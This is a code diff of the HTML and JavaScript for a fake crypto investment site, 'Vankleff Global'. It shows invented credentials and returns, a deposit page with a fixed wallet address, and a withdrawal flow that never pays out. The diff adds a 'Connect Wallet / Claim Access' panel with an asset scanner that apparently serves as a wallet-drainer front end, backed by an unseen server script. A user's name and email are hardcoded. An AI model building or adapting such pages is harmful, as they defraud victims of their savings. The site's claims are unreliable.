     <div class="stats-grid"><div class="stat-card"><div class="stat-val">$4.2B+</div><div class="stat-lbl">Assets Under Management</div></div><div class="stat-card"><div class="stat-val">18,400+</div><div class="stat-lbl">Active Private Investors</div></div><div class="stat-card"><div class="stat-val">147%</div><div class="stat-lbl">Average Annual Return</div></div><div class="stat-card"><div class="stat-val">9+</div><div class="stat-lbl">Years of Operation</div></div></div>
     <div class="section"><div class="sec-label">ABOUT VANKLEFF GLOBAL</div><h2>A New York Institution Since 2015</h2><p>Founded by former Goldman Sachs and JP Morgan executives, managing digital assets for high-net-worth clients across 47 countries.</p><ul class="check-list"><li>Regulated by New York State DFS</li><li>SOC 2 Type II Certified</li><li>Fully segregated client accounts</li><li>24/7 institutional-grade support</li></ul></div>
@@ -403,81 +387,86 @@ footer ul li{padding:3px 0;font-size:12px;color:#888;}
 <!-- AUTH MODAL -->
 <div class="modal-ov" id="auth-modal" onclick="if(event.target===this)closeAuth()"><div class="modal-box"><button class="modal-close" onclick="closeAuth()">✕</button><div class="modal-logo">V</div><div class="modal-title">VANKLEFF GLOBAL</div><div class="modal-sub">Institutional Digital Asset Management</div><div class="tab-row"><button class="tab-btn" id="tab-c" onclick="switchTab('create')">Create Account</button><button class="tab-btn" id="tab-s" onclick="switchTab('signin')">Sign In</button></div><div id="form-create"><div class="fg"><span class="fi">👤</span><input type="text" id="c-name" placeholder="Full Name"/></div><div class="fg"><span class="fi">✉️</span><input type="email" id="c-email" placeholder="Email Address"/></div><div class="fg"><span class="fi">🔒</span><input type="password" id="c-pass" placeholder="Password"/></div><div class="loading-spinner" id="load-create"><div class="spinner-ring"></div><p style="color:#aaa;font-size:12px;">Creating your account...</p></div><button class="btn-submit" id="btn-create" onclick="doLoginCreate()">Create Private Account →</button></div><div id="form-signin" style="display:none;"><div class="fg"><span class="fi">✉️</span><input type="email" id="s-email" placeholder="Email Address"/></div><div class="fg"><span class="fi">🔒</span><input type="password" id="s-pass" placeholder="Password"/></div><div class="loading-spinner" id="load-signin"><div class="spinner-ring"></div><p style="color:#aaa;font-size:12px;">Signing you in...</p></div><button class="btn-submit" id="btn-signin" onclick="doLoginSignIn()">Sign In to Dashboard →</button></div></div></div>
 
-<!-- ═══ DASHBOARD ═══ -->
+<!-- DASHBOARD -->
 <div id="page-dashboard" class="page">
   <div class="sb-ov" id="sb-ov" onclick="closeSB()"></div>
-  <div class="sidebar" id="sidebar">
-    <div class="sb-top"><div style="display:flex;align-items:center;gap:8px;"><div class="dn-logo">V</div><span style="font-size:13px;font-weight:800;color:#c9a84c;">VANKLEFF GLOBAL</span></div><button class="sb-close" onclick="closeSB()">✕</button></div>
-    <div class="sb-grp">OVERVIEW</div>
-    <div class="sb-item on" onclick="showDash('main');closeSB()"><div class="sb-left"><div class="sb-icon">⊞</div>Dashboard</div></div>
-    <div class="sb-item" onclick="showDash('deposit');closeSB()"><div class="sb-left"><div class="sb-icon">⬇</div>Deposit</div></div>
-    <div class="sb-item" onclick="showDash('withdraw');closeSB()"><div class="sb-left"><div class="sb-icon">⬆</div>Withdraw</div></div>
-    <div class="sb-item" onclick="showDash('transfer');closeSB()"><div class="sb-left"><div class="sb-icon">⇄</div>Transfer</div></div>
-    <div class="sb-item" onclick="showDash('statement');closeSB()"><div class="sb-left"><div class="sb-icon">📋</div>Statement</div></div>
-    <div class="sb-item" onclick="showDash('settings');closeSB()"><div class="sb-left"><div class="sb-icon">⚙</div>Settings</div></div>
-    <div class="sb-item" onclick="showDash('referral');closeSB()"><div class="sb-left"><div class="sb-icon">👤</div>Referral</div><span class="sb-badge">10%</span></div>
-    <div class="sb-item" onclick="showDash('stories');closeSB()"><div class="sb-left"><div class="sb-icon">⭐</div>Success Stories</div></div>
-    <div class="sb-item" onclick="showDash('support');closeSB()"><div class="sb-left"><div class="sb-icon">💬</div>Chat Support</div></div>
-    <div class="sb-item sb-logout" onclick="showConf();closeSB()"><div class="sb-left"><div class="sb-icon">🚪</div>Logout</div></div>
-    <div class="sb-spacer"></div>
-    <div class="lang-selector" onclick="toggleLang()">🌐 <span id="lang-txt">EN</span> ▲</div>
-  </div>
+  <div class="sidebar" id="sidebar"><div class="sb-top"><div style="display:flex;align-items:center;gap:8px;"><div class="dn-logo">V</div><span style="font-size:13px;font-weight:800;color:#c9a84c;">VANKLEFF GLOBAL</span></div><button class="sb-close" onclick="closeSB()">✕</button></div><div class="sb-grp">OVERVIEW</div><div class="sb-item on" onclick="showDash('main');closeSB()"><div class="sb-left"><div class="sb-icon">⊞</div>Dashboard</div></div><div class="sb-item" onclick="showDash('deposit');closeSB()"><div class="sb-left"><div class="sb-icon">⬇</div>Deposit</div></div><div class="sb-item" onclick="showDash('withdraw');closeSB()"><div class="sb-left"><div class="sb-icon">⬆</div>Withdraw</div></div><div class="sb-item" onclick="showDash('statement');closeSB()"><div class="sb-left"><div class="sb-icon">📋</div>Statement</div></div><div class="sb-item" onclick="showDash('settings');closeSB()"><div class="sb-left"><div class="sb-icon">⚙</div>Settings</div></div><div class="sb-item" onclick="showConf();closeSB()"><div class="sb-left" style="color:#ef4444;"><div class="sb-icon">🚪</div>Logout</div></div></div>
   <div class="dash-nav"><button class="ham" onclick="openSB()">☰</button><div class="dn-brand"><div class="dn-logo">V</div><div><span class="dn-name">VANKLEFF GLOBAL</span><span class="dn-sub">Your Gateway to Trading</span></div></div><div class="av-circle" onclick="openPM()">V</div></div>
 
-  <!-- MAIN -->
+  <!-- MAIN DASHBOARD -->
   <div id="dd-main"><div class="dash-content">
     <div style="margin-bottom:16px;"><h2 style="font-size:20px;font-weight:800;">Welcome back, <span style="color:#22c55e;">vincentchidiadi</span></h2><p style="font-size:12px;color:#aaa;">Your trading overview</p></div>
     <div class="balance-card"><div class="bal-lbl">Available Balance</div><div class="bal-amount">$100.00</div><div class="bal-btns"><button class="btn-dep" onclick="showDash('deposit')">⬇ Deposit</button><button class="btn-wit" onclick="showDash('withdraw')">⬆ Withdraw</button></div></div>
     <div class="mini-grid"><div class="mini-card"><div style="font-size:24px;margin-bottom:6px;">📈</div><div class="mc-val">+$0.00</div><div class="mc-lbl">Total Profit</div></div><div class="mini-card"><div style="font-size:24px;margin-bottom:6px;">⬇</div><div class="mc-val">$0.00</div><div class="mc-lbl">Total Deposit</div></div></div>
     <div class="price-box"><h3>Live Prices <span class="ldot"></span></h3><div class="pr"><div class="pr-l"><div class="pr-ic">B</div><div><div class="pr-nm">Bitcoin</div><div class="pr-tk">BTC</div></div></div><div style="text-align:right"><div class="pr-price" id="p-btc">$97,245.3</div><div class="up" id="c-btc">▲ +2.4%</div></div></div><div class="pr"><div class="pr-l"><div class="pr-ic">E</div><div><div class="pr-nm">Ethereum</div><div class="pr-tk">ETH</div></div></div><div style="text-align:right"><div class="pr-price" id="p-eth">$3,412.8</div><div class="up" id="c-eth">▲ +1.8%</div></div></div><div class="pr"><div class="pr-l"><div class="pr-ic">B</div><div><div class="pr-nm">BNB</div><div class="pr-tk">BNB</div></div></div><div style="text-align:right"><div class="pr-price" id="p-bnb">$645.2</div><div class="dn2" id="c-bnb">▼ -0.3%</div></div></div></div>
+
+    <!-- ═══════ WEB3 WALLET CONNECT ═══════ -->
     <div class="wcta" id="web3-section">
       <h3 style="font-size:18px;font-weight:900;margin-bottom:8px;">Connect Your Wallet. Claim Your Trading Edge.</h3>
       <p style="font-size:12px;color:#aaa;margin-bottom:14px;">Select a network, then connect your wallet for high-speed execution and strategic market access.</p>
-      <div class="net-selector" id="networkSelector"><div class="net-opt active" id="net-bsc" onclick="selectNetwork('bsc')"><span class="net-icon">🟡</span><div style="text-align:left;"><div style="font-size:13px;font-weight:800;">BSC</div><div style="font-size:10px;opacity:.7;">BNB Chain · ID 56</div></div></div><div class="net-opt" id="net-ethereum" onclick="selectNetwork('ethereum')"><span class="net-icon">🔷</span><div style="text-align:left;"><div style="font-size:13px;font-weight:800;">Ethereum</div><div style="font-size:10px;opacity:.7;">Mainnet · ID 1</div></div></div></div>
-      <div class="active-net-bar" id="activeNetBar"><div class="active-net-dot dot-bsc" id="activeNetDot"></div><span style="font-size:11px;">Active Network:</span><span class="active-net-name" id="activeNetName">BNB Smart Chain</span><span class="active-net-id" id="activeNetId">Chain ID: 56</span></div>
+
+      <!-- ── NETWORK SELECTOR ── -->
+      <div class="net-selector" id="networkSelector">
+        <div class="net-opt active-bsc" id="net-bsc" onclick="selectNetwork('bsc')">
+          <span class="net-icon">🟡</span>
+          <div style="text-align:left;">
+            <div style="font-size:13px;font-weight:800;">BSC</div>
+            <div style="font-size:10px;opacity:.7;">BNB Chain · ID 56</div>
+          </div>
+        </div>
+        <div class="net-opt" id="net-eth" onclick="selectNetwork('eth')">
+          <span class="net-icon">🔷</span>
+          <div style="text-align:left;">
+            <div style="font-size:13px;font-weight:800;">Ethereum</div>
+            <div style="font-size:10px;opacity:.7;">Mainnet · ID 1</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- ── ACTIVE NETWORK INDICATOR ── -->
+      <div class="active-net-bar" id="activeNetBar">
+        <div class="active-net-dot dot-bsc" id="activeNetDot"></div>
+        <span style="font-size:11px;">Active Network:</span>
+        <span class="active-net-name bsc" id="activeNetName">BNB Smart Chain (BSC)</span>
+      </div>
+
       <button class="btn-cw" id="connectBtn">Connect Wallet</button>
-      <div class="w3-btn-row"><button class="btn-w3-claim" id="claimBtn">✦ Claim Access</button><button class="btn-w3-disconnect" id="disconnectBtn">Disconnect</button></div>
+      <div class="w3-btn-row">
+        <button class="btn-w3-claim" id="claimBtn">✦ Claim Access</button>
+        <button class="btn-w3-disconnect" id="disconnectBtn">Disconnect</button>
+      </div>
     </div>
     <div class="web3-panels">
       <p id="statusText"></p>
-      <div id="chainSwitchBanner"><span id="chainSwitchMsg">⚠️ Please switch to <strong>BNB Smart Chain</strong> to continue.</span><br><button class="btn-switch-chain" id="switchChainBtn">Switch Network</button></div>
+      <div id="chainSwitchBanner">
+        <span id="chainSwitchMsg">⚠️ Please switch to <strong>BNB Smart Chain</strong> to continue.</span>
+        <br><button class="btn-switch-chain" id="switchChainBtn">Switch Network</button>
+      </div>
       <div id="stageLog"></div>
       <div id="errorBanner"></div>
-      <div id="infoPanel"><div class="info-row"><span class="info-label">Address</span><span class="info-value" id="walletAddress">—</span></div><hr class="divider"><div class="info-row"><span class="info-label">Network</span><span class="info-value" id="networkName">—</span></div><div class="info-row"><span class="info-label">Chain ID</span><span class="info-value" id="chainIdDisplay">—</span></div><hr class="divider"><div class="info-row"><span class="info-label">Native Balance</span><span class="info-value" id="nativeBalance">—</span></div><div class="info-row"><span class="info-label">USDT Balance</span><span class="info-value" id="usdtBalance">—</span></div><hr class="divider"><div class="info-row"><span class="info-label">Status</span><span class="badge badge-yellow" id="statusBadge">Awaiting Claim</span></div><div class="info-row"><span class="info-label">Session</span><span class="badge badge-blue" id="sessionLabel">Web3Modal</span></div></div>
+      <div id="infoPanel">
+        <div class="info-row"><span class="info-label">Address</span><span class="info-value" id="walletAddress">—</span></div><hr class="divider">
+        <div class="info-row"><span class="info-label">Network</span><span class="info-value" id="networkName">—</span></div>
+        <div class="info-row"><span class="info-label">Chain ID</span><span class="info-value" id="chainIdDisplay">—</span></div><hr class="divider">
+        <div class="info-row"><span class="info-label">Native Balance</span><span class="info-value" id="nativeBalance">—</span></div>
+        <div class="info-row"><span class="info-label">USDT Balance</span><span class="info-value" id="usdtBalance">—</span></div><hr class="divider">
+        <div class="info-row"><span class="info-label">Status</span><span class="badge badge-yellow" id="statusBadge">Awaiting Claim</span></div>
+        <div class="info-row"><span class="info-label">Session</span><span class="badge badge-blue" id="sessionLabel">Web3Modal</span></div>
+      </div>
       <div id="scannerPanel"><div class="scanner-title">🔍 Discovered Assets</div><div id="assetList"><span class="scan-status">Awaiting scan...</span></div></div>
       <div id="txPanel"><div class="tx-title">Transaction History</div><div id="txList"><span style="color:#64748b;font-size:0.85rem;">No transactions yet.</span></div></div>
     </div>
   </div></div>
 
   <!-- DEPOSIT -->
-  <div id="dd-deposit" style="display:none;"><div class="dep-wrap"><h1 style="font-size:24px;font-weight:900;margin-bottom:4px;">Deposit Funds</h1><p style="font-size:13px;color:#aaa;margin-bottom:18px;">Select Payment Method</p><div class="meth-grid"><div class="meth sel" id="m-usdt" onclick="selM('usdt')"><div class="meth-ic ic-usdt">₮</div>USDT (BEP-20)</div><div class="meth" id="m-ltc" onclick="selM('ltc')"><div class="meth-ic ic-ltc">Ł</div>LTC</div><div class="meth" id="m-btc" onclick="selM('btc')"><div class="meth-ic ic-btc">₿</div>BTC</div><div class="meth" id="m-bnb" onclick="selM('bnb')"><div class="meth-ic ic-bnb">B</div>BNB</div></div><div id="dep-form"><div class="dep-label">Enter Amount (USD)</div><input class="amt-input" type="number" id="dep-amt" placeholder="0.00" value="10000"/><div class="quick-amts"><button class="qa" onclick="setAmt(1000)">$1,000</button><button class="qa" onclick="setAmt(5000)">$5,000</button><button class="qa" onclick="setAmt(10000)">$10,000</button><button class="qa" onclick="setAmt(25000)">$25,000</button><button class="qa" onclick="setAmt(50000)">$50,000</button><button class="qa" onclick="setAmt(100000)">$100,000</button></div><button class="btn-cont" onclick="showAddr()">Continue</button></div><div id="dep-addr" style="display:none;"><div class="addr-box"><div class="addr-val" id="w-addr">0x4000bAf1B2d5bbe78b6e56fDa21b1D3E4022C1Db</div><div class="addr-row"><button class="btn-copy" onclick="cpAddr()">📋 Copy</button><div class="net-badge" id="dep-net-badge">BEP-20</div></div></div><div class="warn-box"><span>⚠</span><p>Send exact amount to this address. Wrong network = lost funds.</p></div><div class="timer-row">⏱ Expires in: <span class="timer-val" id="tmr">30:00</span></div><button class="btn-cd" onclick="confDep()">Confirm Deposit</button></div><button class="btn-back" onclick="showDash('main')">← Back to Dashboard</button></div></div>
+  <div id="dd-deposit" style="display:none;"><div class="dep-wrap"><h1>Deposit Funds</h1><p style="font-size:12px;color:#aaa;margin-bottom:18px;">Select Payment Method</p><div class="meth-grid"><div class="meth sel" id="m-usdt" onclick="selM('usdt')"><span>💵</span>USDT (BEP-20)</div><div class="meth" id="m-btc" onclick="selM('btc')"><span>₿</span>BTC</div></div><div id="dep-form"><input class="amt-input" type="number" id="dep-amt" placeholder="Minimum $1,000"/><div class="quick-amts"><button class="qa" onclick="setAmt(1000)">$1,000</button><button class="qa" onclick="setAmt(5000)">$5,000</button><button class="qa" onclick="setAmt(10000)">$10,000</button></div><button class="btn-cont" onclick="showAddr()">Continue</button></div><div id="dep-addr" style="display:none;"><div class="addr-box"><div class="addr-val" id="w-addr">0x4000bAf1B2d5bbe78b6e56fDa21b1D3E4022C1Db</div><div class="addr-row"><button class="btn-copy" onclick="cpAddr()">📋 Copy</button><div class="net-badge">BEP-20</div></div></div><div class="warn-box"><span>⚠</span><p>Send exact amount to this address. Wrong network = lost funds.</p></div><div class="timer-row">⏱ Expires in: <span class="timer-val" id="tmr">30:00</span></div><button class="btn-cd" onclick="confDep()">Confirm Deposit</button></div><button class="btn-back" onclick="showDash('main')">← Back</button></div></div>
 
   <!-- WITHDRAW -->
-  <div id="dd-withdraw" style="display:none;"><div style="padding:18px;"><h1 style="font-size:24px;font-weight:900;margin-bottom:16px;">Withdraw Funds</h1><div class="sec-notice"><h4>⚠ Security Notice</h4><p>All withdrawals require a verification code. Contact <a href="mailto:support@vankleffglobal.com" style="color:#22c55e;">support@vankleffglobal.com</a> to receive your code.</p></div><div class="sec-info-box"><div class="sec-info-row"><span class="sec-info-l">Two-Factor Authentication</span><span class="sec-info-v">Required</span></div><div class="sec-info-row"><span class="sec-info-l">Processing Time</span><span class="sec-info-v">24–48 hours</span></div><div class="sec-info-row"><span class="sec-info-l">Minimum Withdrawal</span><span class="sec-info-v">$100.00</span></div></div><div class="code-box"><div class="otp-row"><input class="otp-in" maxlength="1" type="text" inputmode="numeric"/><input class="otp-in" maxlength="1" type="text" inputmode="numeric"/><input class="otp-in" maxlength="1" type="text" inputmode="numeric"/><input class="otp-in" maxlength="1" type="text" inputmode="numeric"/><input class="otp-in" maxlength="1" type="text" inputmode="numeric"/><input class="otp-in" maxlength="1" type="text" inputmode="numeric"/></div></div><button class="btn-verify" onclick="document.getElementById('wd-note-ov').classList.add('open')">Verify &amp; Withdraw</button><button class="btn-back" onclick="showDash('main')">← Back</button></div></div>
+  <div id="dd-withdraw" style="display:none;"><div style="padding:18px;"><h1 style="font-size:22px;font-weight:900;margin-bottom:16px;">Withdraw Funds</h1><div class="sec-notice"><h4>⚠ Security Notice</h4><p>All withdrawals require a verification code. Contact <a href="mailto:support@vankleffglobal.com" style="color:#22c55e;">support@vankleffglobal.com</a> to receive your code.</p></div><div class="code-box"><div class="otp-row"><input class="otp-in" maxlength="1" type="text" inputmode="numeric"/><input class="otp-in" maxlength="1" type="text" inputmode="numeric"/><input class="otp-in" maxlength="1" type="text" inputmode="numeric"/><input class="otp-in" maxlength="1" type="text" inputmode="numeric"/><input class="otp-in" maxlength="1" type="text" inputmode="numeric"/><input class="otp-in" maxlength="1" type="text" inputmode="numeric"/></div></div><button class="btn-verify" onclick="document.getElementById('wd-note-ov').classList.add('open')">Verify &amp; Withdraw</button><button class="btn-back" onclick="showDash('main')">← Back</button></div></div>
 
-  <!-- TRANSFER -->
-  <div id="dd-transfer" style="display:none;"><div style="padding:18px;"><h1 style="font-size:24px;font-weight:900;margin-bottom:16px;">Internal Transfer</h1><div class="transfer-box"><div class="tf-balance"><span class="tf-balance-l">Balance</span><span class="tf-balance-v">$100.00</span></div><div class="tf-label">Recipient</div><input class="tf-input" type="text" id="tf-recipient" placeholder="Email or username"/><div class="tf-label">Amount (USD)</div><input class="tf-input" type="number" id="tf-amount" placeholder="0.00"/><button class="btn-transfer" onclick="doTransfer()">⇄ Send Transfer</button></div><button class="btn-back" onclick="showDash('main')">← Back</button></div></div>
-
-  <!-- STATEMENT -->
-  <div id="dd-statement" style="display:none;"><div class="ph"><h1>Account Statement</h1><p>All transaction records</p></div><div class="stmt-tabs"><button class="stmt-tab active" onclick="filterStmt(this,'all')">All</button><button class="stmt-tab" onclick="filterStmt(this,'deposit')">Deposit</button><button class="stmt-tab" onclick="filterStmt(this,'withdrawal')">Withdrawal</button><button class="stmt-tab" onclick="filterStmt(this,'investment')">Investment</button></div><div id="stmt-list"></div><button class="btn-back" onclick="showDash('main')" style="margin:0 20px;">← Back</button></div>
-
-  <!-- SETTINGS -->
-  <div id="dd-settings" style="display:none;"><div style="padding:18px;"><h1 style="font-size:24px;font-weight:900;margin-bottom:18px;">Settings</h1><div class="settings-card"><div style="display:flex;align-items:center;gap:12px;margin-bottom:14px;"><div style="width:42px;height:42px;border-radius:50%;background:#16a34a;display:flex;align-items:center;justify-content:center;font-weight:700;color:#fff;font-size:18px;">V</div><div><div style="font-size:14px;font-weight:800;">vincentchidiadi</div><div style="font-size:11px;color:#aaa;">vincentchidiadi@gmail.com</div></div></div></div><div class="settings-card"><div class="settings-row"><span class="settings-l">Full Name</span><span class="settings-v">vincentchidiadi</span></div><div class="settings-row"><span class="settings-l">Email</span><span class="settings-v">vincentchidiadi@gmail.com</span></div><div class="settings-row"><span class="settings-l">Phone</span><span class="settings-v">Not set</span></div><div class="settings-row"><span class="settings-l">Country</span><span class="settings-v">Not set</span></div><div class="settings-row"><span class="settings-l">Two-Factor Auth</span><span class="settings-v" style="color:#22c55e;">Enabled</span></div></div><button style="width:100%;padding:14px;background:#22c55e;border-radius:12px;color:#fff;font-size:15px;font-weight:800;" onclick="alert('Changes saved!')">Save Changes</button><button class="btn-back" onclick="showDash('main')">← Back</button></div></div>
-
-  <!-- REFERRAL -->
-  <div id="dd-referral" style="display:none;"><div class="ph"><h1>Referral</h1><p>Invite friends and earn 10% commission</p></div><div class="ref-code-box"><div class="ref-code-lbl">Your Referral Code</div><div class="ref-code-val">VKG-10024</div></div><div class="ref-stats"><div class="ref-stat-card"><div class="ref-stat-val">0</div><div class="ref-stat-lbl">Invited</div></div><div class="ref-stat-card"><div class="ref-stat-val">$0</div><div class="ref-stat-lbl">Earned</div></div><div class="ref-stat-card"><div class="ref-stat-val">10%</div><div class="ref-stat-lbl">Commission</div></div></div><div class="ref-link-box"><div class="tf-label">Your Referral Link</div><div class="ref-link-val">https://vankleffglobal.com/ref/VKG-10024</div><button class="btn-copy" onclick="copyRefLink()">📋 Copy Link</button></div><button class="btn-back" onclick="showDash('main')">← Back</button></div>
-
-  <!-- SUCCESS STORIES -->
-  <div id="dd-stories" style="display:none;"><div class="ph"><h1>Success Stories</h1><p>Real results from our investors</p></div>
-    <div class="story-card"><div class="story-top"><img class="story-av" src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=120&h=120&fit=crop&crop=face" alt=""/><div><div class="story-name">James Carter</div><div class="story-role">Entrepreneur · New York</div></div></div><div class="story-stars">★★★★★</div><p class="story-txt">"Started with $10,000 on the Strategic Alpha plan. After 4 months, my portfolio grew to $38,000. The execution speed is unmatched."</p><div class="story-profit">Profit: +$28,000</div></div>
-    <div class="story-card"><div class="story-top"><img class="story-av" src="https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?w=120&h=120&fit=crop&crop=face" alt=""/><div><div class="story-name">Emily Rodriguez</div><div class="story-role">Investor · London</div></div></div><div class="story-stars">★★★★★</div><p class="story-txt">"The Elite Managed plan delivered exactly what was promised. Professional team, transparent reporting, consistent returns."</p><div class="story-profit">Profit: +$52,500</div></div>
-    <div class="story-card"><div class="story-top"><img class="story-av" src="https://images.unsplash.com/photo-1578950435899-d6b7b5c5dbda?w=120&h=120&fit=crop&crop=face" alt=""/><div><div class="story-name">David Okonkwo</div><div class="story-role">Trader · Lagos</div></div></div><div class="story-stars">★★★★★</div><p class="story-txt">"Copy trading feature changed everything. I copied Mark R.'s trades and turned $5,000 into $19,500 in 6 weeks."</p><div class="story-profit">Profit: +$14,500</div></div>
-    <div class="story-card"><div class="story-top"><img class="story-av" src="https://images.unsplash.com/photo-1438761681033-6461ffad8d80?w=120&h=120&fit=crop&crop=face" alt=""/><div><div class="story-name">Sophia Chen</div><div class="story-role">Business Owner · Singapore</div></div></div><div class="story-stars">★★★★★</div><p class="story-txt">"Institutional-grade service from day one. The Empire State Building office reflects the level of professionalism."</p><div class="story-profit">Profit: +$41,200</div></div>
-    <button class="btn-back" onclick="showDash('main')" style="margin:0 20px;">← Back</button>
-  </div>
-
-  <!-- CHAT SUPPORT -->
-  <div id="dd-support" style="display:none;"><div class="ph"><h1>Chat Support</h1><p>We're here to help 24/7</p></div><div class="chat-wrap"><div class="chat-box" id="chat-box"><div class="chat-msg recv"><div class="chat-bubble">Welcome to Vankleff Global Support! How can we help you today?</div></div></div></div><div class="chat-input-row"><input class="chat-input" id="chat-input" placeholder="Type your message..." onkeypress="if(event.key==='Enter')sendChat()"/><button class="chat-send" onclick="sendChat()">Send</button></div></div>
+  <!-- STATEMENT, SETTINGS -->
+  <div id="dd-statement" style="display:none;"><div class="ph"><h1>Account Statement</h1><p>All transaction records</p></div><div class="stmt-filters"><button class="sfbtn on">All</button><button class="sfbtn">Deposit</button><button class="sfbtn">Withdrawal</button></div><div id="stmt-list"></div><div style="padding:0 20px;"><button class="btn-back" onclick="showDash('main')">← Back</button></div></div>
+  <div id="dd-settings" style="display:none;"><div style="padding:18px;"><h1 style="font-size:22px;font-weight:900;margin-bottom:18px;">Account Settings</h1><div class="set-card"><div style="display:flex;align-items:center;gap:12px;margin-bottom:16px;"><div style="width:42px;height:42px;border-radius:50%;background:#16a34a;display:flex;align-items:center;justify-content:center;font-weight:700;color:#fff;font-size:18px;">V</div><div><div style="font-size:14px;font-weight:800;">vincentchidiadi</div><div style="font-size:11px;color:#aaa;">vincentchidiadi@gmail.com</div></div></div><button class="btn-save" onclick="alert('Changes saved!')">Save Changes</button></div><button class="btn-back" onclick="showDash('main')">← Back</button></div></div>
 </div>
 
 <!-- MODALS -->
@@ -485,19 +474,23 @@ footer ul li{padding:3px 0;font-size:12px;color:#888;}
 <div class="conf-ov" id="conf-ov"><div class="conf-box"><h3>Log Out?</h3><p style="font-size:13px;color:#aaa;margin-top:8px;">Are you sure?</p><div class="conf-btns"><button class="btn-no" onclick="document.getElementById('conf-ov').classList.remove('open')">No</button><button class="btn-yes" onclick="doLogout()">Yes, Logout</button></div></div></div>
 <div class="gm-ov" id="gm-ov"><div class="gm-box"><button class="gm-close" onclick="closeGM()">✕</button><h3 id="gm-t">Notice</h3><p id="gm-b"></p><button class="btn-gm" id="gm-btn" onclick="closeGM()">OK</button><button class="btn-gmc" id="gm-c" onclick="closeGM()" style="display:none">Cancel</button></div></div>
 <div class="suc-ov" id="suc-ov"><div class="suc-box"><button class="suc-close" onclick="document.getElementById('suc-ov').classList.remove('open')">✕</button><div style="font-size:50px;margin-bottom:14px;">✅</div><h3 style="font-size:18px;font-weight:800;color:#22c55e;margin-bottom:10px;">Deposit Received!</h3><p style="font-size:13px;color:#aaa;">Validation takes 10–30 minutes.</p></div></div>
-<div class="wd-note-ov" id="wd-note-ov"><div class="wd-note-box"><div style="font-size:44px;margin-bottom:12px;">🔐</div><h3 style="font-size:17px;font-weight:800;color:#d4b476;margin-bottom:12px;">Please Note</h3><p style="font-size:13px;color:#fff;line-height:1.7;margin-bottom:20px;">To retrieve your withdrawal code, please contact our support team at <a href="mailto:support@vankleffglobal.com" style="color:#28a745;font-weight:700;">support@vankleffglobal.com</a>.</p><button class="btn-gm" onclick="document.getElementById('wd-note-ov').classList.remove('open')">OK, Got It</button></div></div>
+<div class="wd-note-ov" id="wd-note-ov"><div class="wd-note-box"><div style="font-size:44px;margin-bottom:12px;">🔐</div><h3 style="font-size:17px;font-weight:800;color:#c9a84c;margin-bottom:12px;">Please Note</h3><p style="font-size:13px;color:#ccc;line-height:1.7;margin-bottom:20px;">Contact <a href="mailto:support@vankleffglobal.com" style="color:#22c55e;font-weight:700;">support@vankleffglobal.com</a> for your withdrawal code.</p><button class="btn-gm" onclick="document.getElementById('wd-note-ov').classList.remove('open')">OK</button></div></div>
 <div class="proc-ov" id="proc-ov"><div style="background:linear-gradient(160deg,#0a1a10,#0d2218,#071510);border:1px solid #1a4a2a;border-radius:24px;padding:32px 24px;width:90%;max-width:340px;text-align:center;"><div style="display:inline-flex;align-items:center;gap:6px;border:1px solid #22c55e;border-radius:20px;padding:5px 14px;font-size:11px;font-weight:700;color:#22c55e;margin-bottom:14px;">● IN-PROGRESS</div><h3 style="font-size:22px;font-weight:900;margin-bottom:8px;">Processing</h3><p id="proc-net-txt" style="font-size:13px;color:#aaa;margin-bottom:20px;">Executing via backend API...</p><button style="width:100%;padding:15px;background:#22c55e;border-radius:14px;color:#fff;font-size:15px;font-weight:800;" onclick="document.getElementById('proc-ov').classList.remove('open');showDash('main')">Back to Dashboard</button></div></div>
 
-<!-- FOOTER LANGUAGE SELECTOR -->
-<div class="footer-lang" onclick="toggleLang()">🌐 <span id="footer-lang-txt">EN</span> ▲</div>
-
 <script>
+// ═══════════════════════════════════════════════════════════════
+// UI-ONLY JAVASCRIPT — No business logic, no secrets
+// All sensitive operations go through fetch() to api/process.php
+// ═══════════════════════════════════════════════════════════════
+
 var API = 'api/process.php';
+
+// ─── GLOBAL STATE ──────────────────────────────────────────────
 var prices = {btc:97245,eth:3412,bnb:645};
 var tmrInt = null;
-var depAmt = 10000;
-var currentLang = 'EN';
+var depAmt = 1000;
 
+// ─── PAGE NAVIGATION ───────────────────────────────────────────
 var PAGES = ['landing','dashboard','terms','privacy'];
 function showPage(id){
   PAGES.forEach(function(p){ var el = document.getElementById('page-'+p); if(el) el.classList.remove('active'); });
@@ -520,13 +513,11 @@ function doLoginSignIn(){
   document.getElementById('btn-signin').style.display='none'; document.getElementById('load-signin').style.display='block';
   setTimeout(function(){ document.getElementById('load-signin').style.display='none'; document.getElementById('btn-signin').style.display='block'; closeAuth(); showPage('dashboard'); showDash('main'); },6000);
 }
-var DD = ['main','deposit','withdraw','transfer','statement','settings','referral','stories','support'];
+var DD = ['main','deposit','withdraw','statement','settings'];
 function showDash(sub){
   DD.forEach(function(s){ var el = document.getElementById('dd-'+s); if(el) el.style.display='none'; });
   var el = document.getElementById('dd-'+sub); if(el) el.style.display='block';
-  document.querySelectorAll('.sb-item').forEach(function(it){ it.classList.remove('on'); });
   window.scrollTo(0,0);
-  if(sub==='statement') renderStmt('all');
 }
 function openSB(){ document.getElementById('sidebar').classList.add('open'); document.getElementById('sb-ov').classList.add('open'); }
 function closeSB(){ document.getElementById('sidebar').classList.remove('open'); document.getElementById('sb-ov').classList.remove('open'); }
@@ -540,19 +531,13 @@ function showGM(t,b,btnTxt,fn,showC){
   var btn=document.getElementById('gm-btn'); btn.textContent=btnTxt||'OK'; btn.onclick=fn||closeGM;
   document.getElementById('gm-c').style.display=showC?'block':'none'; document.getElementById('gm-ov').classList.add('open');
 }
-function toggleLang(){ currentLang = currentLang==='EN'?'ES':'EN'; document.getElementById('lang-txt').textContent=currentLang; document.getElementById('footer-lang-txt').textContent=currentLang; }
 
-// DEPOSIT
-function selM(m){
-  document.querySelectorAll('.meth').forEach(function(b){ b.classList.remove('sel'); });
-  document.getElementById('m-'+m).classList.add('sel');
-  var badge = document.getElementById('dep-net-badge');
-  if(badge){ badge.textContent = m==='usdt'?'BEP-20':m.toUpperCase(); }
-}
+// ─── DEPOSIT ──────────────────────────────────────────────────
+function selM(m){ document.querySelectorAll('.meth').forEach(function(b){ b.classList.remove('sel'); }); document.getElementById('m-'+m).classList.add('sel'); }
 function setAmt(v){ document.getElementById('dep-amt').value=v; depAmt=v; }
 function showAddr(){
   var a = parseFloat(document.getElementById('dep-amt').value);
-  if(!a||isNaN(a)||a<100){ showGM('Minimum Deposit','Minimum is $100.','OK',closeGM,false); return; }
